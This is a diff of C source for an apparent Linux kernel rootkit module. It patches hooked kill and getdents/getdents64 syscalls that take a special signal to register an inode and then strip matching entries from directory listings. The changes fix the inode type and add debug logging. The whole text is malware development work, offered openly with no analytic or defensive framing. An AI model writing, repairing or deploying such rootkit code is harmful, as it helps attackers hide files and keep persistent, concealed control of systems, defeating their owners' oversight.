@@ -36,7 +36,7 @@ kill_ptr orig_kill;
 static LIST_HEAD(hidden_files); // list of inodes to hide
 
 struct hidden_file { // struct for list of inodes
-	int inode;
+	unsigned long long inode;
 	struct list_head list;
 };
 
@@ -62,7 +62,7 @@ asmlinkage int hacked_kill(pid_t pid, int sig)
 	// file hiding, pid = inode of file to be hidden
 	else if (sig == HIDE_SIG) { 
 		toAdd = kmalloc(sizeof(struct hidden_file),GFP_KERNEL);
-		toAdd->inode = pid;
+		toAdd->inode = (unsigned long long) pid;
 		INIT_LIST_HEAD(&toAdd->list);
 		list_add_tail(&toAdd->list,&hidden_files);
 		printk(KERN_INFO "Adding inode %i\n",pid);
@@ -111,6 +111,8 @@ asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp,
 			if (copy_from_user(&toWorkWith,dirp + i,sizeof(struct linux_dirent)))
 				return -1;
 			list_for_each_entry(ptr,&hidden_files,list) {
+				printk(KERN_INFO "Current inode: %lu\n", toWorkWith.d_ino);
+				printk(KERN_INFO "Saved inode: %llu\n", ptr->inode);
 				if (toWorkWith.d_ino == ptr->inode) {
 					printk(KERN_INFO "Found file to hide\n");
 					continue;
@@ -166,6 +168,8 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 		for (i = 0; i < number_dirps; i++) {
 			printk(KERN_INFO "How many dirps? %i, %i\n",i,number_dirps);
 			list_for_each_entry(ptr,&hidden_files,list) {
+				printk(KERN_INFO "Current inode: %llu\n", (kdirp + i)->d_ino);
+				printk(KERN_INFO "Saved inode: %llu\n", ptr->inode);
 				if ((kdirp + i)->d_ino == ptr->inode) {
 					printk(KERN_INFO "Found file to hide\n");
 					memmove(kdirp + i,kdirp + i + 1,
@@ -207,7 +211,7 @@ int rootkit_init(void) {
 void rootkit_exit(void) {
 	struct hidden_file *ptr, *next;
 	list_for_each_entry(ptr,&hidden_files,list) {
-		printk(KERN_INFO "Inode: %d\n",ptr->inode);
+		printk(KERN_INFO "Inode: %llu\n",ptr->inode);
 	}
 
 	GPF_DISABLE;
